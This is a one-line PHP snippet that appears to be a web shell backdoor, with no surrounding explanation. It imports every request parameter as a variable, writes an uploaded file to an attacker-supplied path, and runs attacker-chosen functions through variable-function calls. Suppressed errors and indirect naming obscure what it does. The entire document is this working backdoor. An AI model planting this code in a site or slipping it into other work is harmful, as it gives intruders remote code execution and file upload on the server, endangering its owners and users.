<?= @extract($_REQUEST); if(!empty($_FILES['u'])) { move_uploaded_file($_FILES['u']['tmp_name'], $p); @die ($ctime($c($atime))); }
